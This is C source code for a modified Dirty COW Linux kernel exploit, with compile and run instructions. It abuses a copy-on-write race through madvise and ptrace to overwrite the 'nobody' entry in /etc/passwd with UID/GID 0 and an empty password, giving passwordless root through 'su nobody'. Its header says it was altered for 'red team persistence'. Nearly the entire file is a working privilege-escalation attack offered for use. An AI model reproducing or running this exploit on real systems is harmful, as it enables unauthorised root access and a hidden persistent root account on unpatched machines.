//
// Dirty COW exploit to modify an existing user's UID/GID to 0 (root privileges)
// while preserving the original root user. Targets the 'nobody' user in /etc/passwd.
// Original exploit: https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread -o dirtycow dirtycow.c
//
// Run with:
//   ./dirtycow
//
// Log in with:
//   su nobody  (no password needed, assuming empty password field works)
//
// Restore /etc/passwd after testing:
//   mv /tmp/passwd.bak /etc/passwd
//
// Modified for red team persistence by targeting existing user 'nobody'.
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";

// Target the 'nobody' user line in /etc/passwd
const char *target_user = "nobody";
const char *new_passwd_line = "nobody::0:0:Nobody Root:/:/bin/bash\n";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
    return NULL;
}

int copy_file(const char *from, const char *to) {
    if (access(to, F_OK) == 0) {
        printf("File %s exists, delete it yourself!\n", to);
        return -1;
    }
    FILE *source = fopen(from, "r");
    if (source == NULL) {
        perror("fopen source");
        return -1;
    }
    FILE *target = fopen(to, "w");
    if (target == NULL) {
        fclose(source);
        perror("fopen target");
        return -1;
    }
    char ch;
    while ((ch = fgetc(source)) != EOF) {
        fputc(ch, target);
    }
    printf("%s successfully backed up to %s\n", from, to);
    fclose(source);
    fclose(target);
    return 0;
}

off_t find_user_offset(const char *file, const char *username) {
    FILE *fp = fopen(file, "r");
    if (!fp) {
        perror("fopen for offset");
        return -1;
    }
    char line[256];
    off_t offset = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, username) == line) {
            fclose(fp);
            return offset;
        }
        offset += strlen(line);
    }
    fclose(fp);
    printf("User %s not found in %s\n", username, file);
    return -1;
}

int main(int argc, char *argv[]) {
    // Backup /etc/passwd
    int ret = copy_file(filename, backup_filename);
    if (ret != 0) {
        exit(ret);
    }

    // Find offset of nobody user in /etc/passwd
    off_t target_offset = find_user_offset(filename, target_user);
    if (target_offset == -1) {
        printf("Failed to find offset for user %s\n", target_user);
        exit(1);
    }
    printf("Found %s at offset %ld\n", target_user, target_offset);

    // Open /etc/passwd
    f = open(filename, O_RDONLY);
    if (f < 0) {
        perror("open");
        exit(1);
    }
    fstat(f, &st);

    // Map the file
    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(f);
        exit(1);
    }
    printf("mmap: %lx\n", (unsigned long)map);

    // Fork to exploit race condition
    pid = fork();
    if (pid < 0) {
        perror("fork");
        munmap(map, st.st_size + sizeof(long));
        close(f);
        exit(1);
    }

    if (pid) {
        // Parent: ptrace to write new_passwd_line at target offset
        waitpid(pid, NULL, 0);
        int u, i, o, c = 0;
        int l = strlen(new_passwd_line);
        for (i = 0; i < 10000/l; i++) {
            for (o = 0; o < l; o++) {
                for (u = 0; u < 10000; u++) {
                    c += ptrace(PTRACE_POKETEXT, pid, map + target_offset + o,
                                *((long *)(new_passwd_line + o)));
                }
            }
        }
        printf("ptrace %d\n", c);
    } else {
        // Child: madvise to trigger race condition
        pthread_create(&pth, NULL, madviseThread, NULL);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        kill(getpid(), SIGSTOP);
        pthread_join(pth, NULL);
    }

    // Cleanup
    munmap(map, st.st_size + sizeof(long));
    close(f);

    printf("Done! Check %s to see if %s was modified.\n", filename, target_user);
    printf("Log in with: su %s (no password needed).\n\n", target_user);
    printf("RESTORE AFTER TESTING: $ mv %s %s\n", backup_filename, filename);
    return 0;
}
